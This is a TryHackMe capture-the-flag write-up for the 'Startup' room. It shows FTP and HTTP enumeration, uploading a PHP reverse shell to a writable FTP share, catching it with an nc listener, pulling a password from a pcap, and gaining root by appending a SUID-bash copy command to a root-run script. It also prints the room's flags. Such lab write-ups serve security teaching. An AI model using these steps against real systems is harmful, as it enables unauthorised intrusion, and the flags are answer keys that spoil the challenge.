---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - writable-ftp-directory
  - network-traffic-inspection
---

# Startup
![Startup logo](logos/startup_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Startup](https://tryhackme.com/room/startup)  

## Description
"Abuse traditional vulnerabilities via untraditional means.  
We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!"

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.00046s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.81.79.24
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (98%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%), Linux 3.13 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
```

### FTP Enuemeration
```
ftp TARGET_IP_ADDRESS
Connected to TARGET_IP_ADDRESS.
220 (vsFTPd 3.0.3)
Name (TARGET_IP_ADDRESS:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> get important.jpg
local: important.jpg remote: important.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
226 Transfer complete.
251631 bytes received in 0.10 secs (2.5204 MB/s)
ftp> get notice.txt
local: notice.txt remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (208 bytes).
226 Transfer complete.
208 bytes received in 0.00 secs (2.2541 MB/s)
ftp> cd ftp
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> bye
221 Goodbye.
root@ip-10-81-79-24:~# cat notice.txt
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

### HTTP Enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* Static holding page in web browser  
* No `robots.txt` or `sitemap` files  
* Nothing interesting in the source code  
* `ffuf` scan reveals `/files` directory: reveals `ftp` share is serviced through HTTP  

### Vulnerability Enumeration
```
searchsploit vsftpd 3.0.3	# Only result: DoS
searchsploit OpenSSH 7.2p2	# Only result: username enumeration
searchsploit httpd 2.4.18	# Only result: DoS
```

## Foothold
**Action(s)**  
:white_check_mark: Upload [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to writable `/ftp` directory using `ftp`  
*File saved as shell.php ready for upload*

```
ftp TARGET_IP_ADDRESS
Connected to TARGET_IP_ADDRESS.
220 (vsFTPd 3.0.3)
Name (TARGET_IP_ADDRESS:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5683 bytes sent in 0.00 secs (83.3805 MB/s)
ftp> bye
221 Goodbye.
root@ip-10-81-79-24:~# nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on TARGET_IP_ADDRESS 51378
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:18:41 up  1:33,  0 users,  load average: 0.00, 0.11, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@startup:/$ ls -al
total 100
drwxr-xr-x  25 root     root      4096 May  2 16:45 .
drwxr-xr-x  25 root     root      4096 May  2 16:45 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 May  2 16:45 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 124 root     root         0 May  2 16:45 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       900 May  2 17:45 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 May  2 16:45 sys
drwxrwxrwt   7 root     root      4096 May  2 18:21 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
www-data@startup:/$ cat recipe.txt
```
??? success "What is the secret spicy soup recipe?"
	love

```
www-data@startup:/$ ls -al /incidents
total 40
drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
drwxr-xr-x 25 root     root      4096 May  2 16:45 ..
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
www-data@startup:/$ cp /incidents/suspicious.pcapng /var/www/html/files/ftp
```

**Action(s)**  
:white_check_mark: Download `suspicious.pcapng` from HTTP FTP share in web browser and inspect with Wireshark  
*Potential password for "lennie" user found in .pcapng file: "c4ntg3t3n0ughsp1c3"*

```
ssh lennie@TARGET_IP_ADDRESS
lennie@TARGET_IP_ADDRESS's password: 

$ pwd
/home/lennie
$ ls -al 
total 24
drwx------ 5 lennie lennie 4096 May  2 18:43 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwx------ 2 lennie lennie 4096 May  2 18:43 .cache
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
$ cat user.txt
```
??? success "What are the contents of user.txt?"
	THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

## Privilege Escalation
```
$ ls -al scripts
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 May  2 18:58 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 May  2 18:58 startup_list.txt
$ cat scripts/planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
$ cat scripts/startup_list.txt

$ echo $LIST

$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
$ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/print.sh
$ /tmp/rootbash -p

rootbash-4.3# ls -al /root
total 28
drwx------  4 root root 4096 Nov 12  2020 .
drwxr-xr-x 25 root root 4096 May  2 16:45 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Nov 12  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   38 Nov 12  2020 root.txt
drwx------  2 root root 4096 Nov 12  2020 .ssh
rootbash-4.3# cat /root/root.txt
```
??? success "What are the contents of root.txt?"
	THM{f963aaa6a430f210222158ae15c3d76d}

**Tools Used**  
`Wireshark`

**Date completed:** 02/05/26  
**Date published:** 02/05/26